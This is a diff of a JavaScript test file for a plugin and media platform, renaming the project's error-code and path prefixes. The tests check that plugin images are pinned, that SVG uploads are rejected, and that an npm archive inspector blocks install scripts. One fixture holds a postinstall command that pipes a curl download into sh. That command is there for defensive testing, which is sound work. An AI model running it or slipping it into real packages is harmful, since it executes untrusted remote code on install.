@@ -38,8 +38,8 @@ test('third-party plugin manifests only allow the versioned capability vocabular
 
 test('isolated plugin runner fails closed unless an immutable image is explicitly allow-listed', async () => {
   const runner = createContainerPluginRunner({ allowedImages: [] });
-  await assert.rejects(() => runner.invoke({ imageDigest: 'registry.example/plugin:latest', action: 'render.widget', input: {} }), { code: 'ERR_SYSTEMFABRIC_PLUGIN_IMAGE_NOT_PINNED' });
-  await assert.rejects(() => runner.invoke({ imageDigest: `registry.example/plugin@sha256:${'a'.repeat(64)}`, action: 'render.widget', input: {} }), { code: 'ERR_SYSTEMFABRIC_PLUGIN_IMAGE_NOT_ALLOWED' });
+  await assert.rejects(() => runner.invoke({ imageDigest: 'registry.example/plugin:latest', action: 'render.widget', input: {} }), { code: 'ERR_VIRGOSCORPIO_HUB_PLUGIN_IMAGE_NOT_PINNED' });
+  await assert.rejects(() => runner.invoke({ imageDigest: `registry.example/plugin@sha256:${'a'.repeat(64)}`, action: 'render.widget', input: {} }), { code: 'ERR_VIRGOSCORPIO_HUB_PLUGIN_IMAGE_NOT_ALLOWED' });
   assert.throws(() => createContainerPluginRunner({ timeoutMs: 10 }), /timeout/);
 });
 
@@ -52,7 +52,7 @@ test('media type checks are based on file signatures, not client MIME labels', (
 });
 
 test('local media files are created exclusively with owner-only permissions', async t => {
-  const root = await fs.promises.mkdtemp(path.join(os.tmpdir(), 'systemfabric-media-permissions-'));
+  const root = await fs.promises.mkdtemp(path.join(os.tmpdir(), 'virgoscorpio_hub-media-permissions-'));
   t.after(() => fs.promises.rm(root, { recursive: true, force: true }));
   const image = Buffer.from([0x89,0x50,0x4e,0x47,0x0d,0x0a,0x1a,0x0a,0x00]);
   let insertedValues;
@@ -74,22 +74,22 @@ test('local media files are created exclusively with owner-only permissions', as
 });
 
 test('media upload rejects SVG and unsupported files before touching storage', async t => {
-  const root = await fs.promises.mkdtemp(path.join(os.tmpdir(), 'systemfabric-media-invalid-'));
+  const root = await fs.promises.mkdtemp(path.join(os.tmpdir(), 'virgoscorpio_hub-media-invalid-'));
   t.after(() => fs.promises.rm(root, { recursive: true, force: true }));
   const calls = [];
   const store = createLocalMediaStore({ pool: { query: async (...args) => { calls.push(args); return { rows: [] }; } }, root });
-  await assert.rejects(() => store.upload({ siteId: '00000000-0000-4000-8000-000000000001', dataBase64: Buffer.from('<svg></svg>').toString('base64'), mimeType: 'image/svg+xml' }), { code: 'ERR_SYSTEMFABRIC_MEDIA_INVALID' });
+  await assert.rejects(() => store.upload({ siteId: '00000000-0000-4000-8000-000000000001', dataBase64: Buffer.from('<svg></svg>').toString('base64'), mimeType: 'image/svg+xml' }), { code: 'ERR_VIRGOSCORPIO_HUB_MEDIA_INVALID' });
   assert.equal(calls.length, 0);
 });
 
 test('npm archive inspector validates safe metadata and rejects install lifecycle scripts', async t => {
   const fs = require('node:fs'); const os = require('node:os'); const path = require('node:path'); const { execFileSync } = require('node:child_process');
   const { inspectNpmArchive } = require('../packages/plugins/src/archive-inspector');
-  const root = await fs.promises.mkdtemp(path.join(os.tmpdir(), 'sf-plugin-')); t.after(() => fs.promises.rm(root, { recursive: true, force: true }));
+  const root = await fs.promises.mkdtemp(path.join(os.tmpdir(), 'vsh-plugin-')); t.after(() => fs.promises.rm(root, { recursive: true, force: true }));
   const packageRoot = path.join(root, 'package'); await fs.promises.mkdir(packageRoot);
   const packageJson = {
     name: 'vendor-example-widget', version: '1.0.0',
-    systemfabricPlugin: { apiVersion: 1, name: 'vendor.example-widget', version: '1.0.0', title: 'Example Widget', description: 'Example', capabilities: ['render:widget'] }
+    virgoscorpio_hubPlugin: { apiVersion: 1, name: 'vendor.example-widget', version: '1.0.0', title: 'Example Widget', description: 'Example', capabilities: ['render:widget'] }
   };
   const jsonPath = path.join(packageRoot, 'package.json'); await fs.promises.writeFile(jsonPath, JSON.stringify(packageJson));
   const archive = path.join(root, 'valid.tgz'); execFileSync('tar', ['-czf', archive, '-C', root, 'package']);
@@ -105,5 +105,5 @@ test('npm archive inspector validates safe metadata and rejects install lifecycl
   assert.equal(prefixed.packageVersion, '1.0.0');
   packageJson.scripts = { postinstall: 'curl https://example.test | sh' }; await fs.promises.writeFile(jsonPath, JSON.stringify(packageJson));
   const scripted = path.join(root, 'scripted.tgz'); execFileSync('tar', ['-czf', scripted, '-C', root, 'package']);
-  await assert.rejects(() => inspectNpmArchive(scripted), { code: 'ERR_SYSTEMFABRIC_PLUGIN_INSTALL_SCRIPT' });
+  await assert.rejects(() => inspectNpmArchive(scripted), { code: 'ERR_VIRGOSCORPIO_HUB_PLUGIN_INSTALL_SCRIPT' });
 });
